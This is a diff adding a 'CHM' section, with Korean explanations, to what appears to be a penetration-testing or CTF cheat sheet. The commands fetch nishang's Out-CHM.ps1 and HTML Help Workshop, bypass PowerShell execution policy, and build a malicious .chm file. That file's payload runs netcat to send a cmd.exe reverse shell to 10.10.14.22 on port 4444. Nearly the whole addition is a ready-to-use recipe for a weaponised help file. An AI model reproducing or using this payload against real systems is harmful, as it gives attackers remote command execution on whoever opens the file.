@@ -684,3 +684,26 @@ systemctl list-timers
 ```
  
 </details>
+
+---
+<details>
+ <summary><strong>CHM</strong></summary>
+
+- `.chm`파일을 실행하여 셸을 획득할 수 있음.
+- `windows`에서 파일 생성.
+
+```bash
+cp /usr/share/nishang/Client/Out-CHM.ps1 .
+
+wget http://web.archive.org/web/20160201063255/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe
+```
+```powershell
+# HTML Help Workshop 설치 필요
+powershell -ep bypass
+
+. .\Out-CHM.ps1
+
+Out-CHM -Payload "c:\users\chris\downloads\nc.exe 10.10.14.22 4444 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+```
+
+</details>
